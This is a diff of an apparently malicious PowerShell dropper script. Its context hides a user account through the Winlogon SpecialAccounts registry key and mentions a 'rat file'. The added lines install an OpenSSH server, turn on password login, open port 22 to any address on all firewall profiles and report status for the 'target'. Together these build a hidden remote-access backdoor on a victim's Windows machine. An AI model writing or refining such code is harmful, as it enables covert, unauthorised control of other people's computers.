@@ -33,52 +33,81 @@ $jmQikqoKMZ = '00000000'
 New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name SpecialAccounts -Force
 New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts' -Name UserList -Force
 New-ItemProperty -Path $csfMFzvgEN -Name $sqbXFdLvyw -Value $jmQikqoKMZ -PropertyType DWORD -Force
+# =============== SSH SECTION - ALTERNATIVE METHOD ===============
+# Check if SSH is already installed
+$sshInstalled = Get-WindowsCapability -Online | Where-Object {$_.Name -like "*OpenSSH.Server*"}
 
-# =============== SSH SECTION - FIXED ===============
-# ssh installation
-Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+if (-not $sshInstalled -or $sshInstalled.State -ne "Installed") {
+    Write-Host "[*] Installing OpenSSH Server..." -ForegroundColor Yellow
+    
+    # METHOD 1: Try Windows Capability (might fail on Home edition)
+    try {
+        Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction Stop
+        Write-Host "[+] OpenSSH installed via Windows Capability" -ForegroundColor Green
+    } catch {
+        Write-Host "[!] Windows Capability failed, trying manual install..." -ForegroundColor Red
+        
+        # METHOD 2: Manual installation from GitHub
+        $url = "https://github.com/PowerShell/Win32-OpenSSH/releases/download/v9.5.0.0p1-Beta/OpenSSH-Win64.zip"
+        $zipPath = "$env:TEMP\OpenSSH-Win64.zip"
+        $installPath = "C:\Program Files\OpenSSH"
+        
+        # Download and extract OpenSSH
+        Invoke-WebRequest -Uri $url -OutFile $zipPath
+        Expand-Archive -Path $zipPath -DestinationPath $installPath -Force
+        
+        # Install SSH
+        Set-Location "$installPath"
+        .\install-sshd.ps1
+        
+        Remove-Item $zipPath -Force
+        Write-Host "[+] OpenSSH installed manually from GitHub" -ForegroundColor Green
+    }
+}
 
-# Start SSH service
-Start-Service sshd
-Set-Service -Name sshd -StartupType 'Automatic'
-
-# Create SSH directory
-New-Item -ItemType Directory -Path "$env:USERPROFILE\.ssh" -Force
-ssh-keyscan -H localhost >> "$env:USERPROFILE\.ssh\known_hosts" 2>$null
-
-# FIREWALL RULES - CRITICAL FIX FOR EXTERNAL CONNECTIONS
-# Remove existing SSH rules if they exist
-Remove-NetFirewallRule -Name "OpenSSH-Server" -ErrorAction SilentlyContinue
-Remove-NetFirewallRule -Name "SSH-Allow-All" -ErrorAction SilentlyContinue
-
-# Create NEW firewall rule for ALL profiles (Domain, Private, Public)
-New-NetFirewallRule -Name "SSH-Allow-All" `
-  -DisplayName "SSH Allow All Inbound" `
-  -Enabled True `
-  -Direction Inbound `
-  -Protocol TCP `
-  -LocalPort 22 `
-  -RemoteAddress Any `
-  -Profile Domain,Private,Public `
-  -Action Allow
-
-# Also allow outbound for SSH (optional, but good for reverse tunnels)
-New-NetFirewallRule -Name "SSH-Allow-Outbound" `
-  -DisplayName "SSH Allow Outbound" `
-  -Enabled True `
-  -Direction Outbound `
-  -Protocol TCP `
-  -LocalPort 22 `
-  -RemoteAddress Any `
-  -Profile Domain,Private,Public `
-  -Action Allow
-
-# Restart SSH to apply all changes
-Restart-Service sshd
-
-# Test SSH locally
-Start-Sleep -Seconds 2
-Test-NetConnection -ComputerName localhost -Port 22
+# Configure and start SSH service
+try {
+    # Start SSH service
+    Start-Service sshd -ErrorAction Stop
+    Set-Service -Name sshd -StartupType 'Automatic'
+    
+    # Configure SSH to allow password authentication
+    $sshdConfig = "C:\ProgramData\ssh\sshd_config"
+    if (Test-Path $sshdConfig) {
+        (Get-Content $sshdConfig) -replace '#PasswordAuthentication yes', 'PasswordAuthentication yes' | Set-Content $sshdConfig
+        (Get-Content $sshdConfig) -replace 'PasswordAuthentication no', 'PasswordAuthentication yes' | Set-Content $sshdConfig
+    }
+    
+    # FIREWALL RULES
+    Remove-NetFirewallRule -Name "SSH-Allow-All" -ErrorAction SilentlyContinue
+    
+    New-NetFirewallRule -Name "SSH-Allow-All" `
+      -DisplayName "SSH Allow All Inbound" `
+      -Enabled True `
+      -Direction Inbound `
+      -Protocol TCP `
+      -LocalPort 22 `
+      -RemoteAddress Any `
+      -Profile Any `
+      -Action Allow
+    
+    # Restart SSH service
+    Restart-Service sshd -Force
+    
+    # Test SSH locally
+    Start-Sleep -Seconds 3
+    Write-Host "[*] Testing SSH service..." -ForegroundColor Yellow
+    $testResult = Test-NetConnection -ComputerName localhost -Port 22 -WarningAction SilentlyContinue
+    if ($testResult.TcpTestSucceeded) {
+        Write-Host "[+] SSH is running on port 22" -ForegroundColor Green
+    } else {
+        Write-Host "[!] SSH test failed. Manual check required." -ForegroundColor Red
+    }
+    
+} catch {
+    Write-Host "[!] SSH configuration failed: $_" -ForegroundColor Red
+    Write-Host "[!] Manual SSH setup required on target." -ForegroundColor Red
+}
 # =============== END SSH SECTION ===============
 
 # rat file
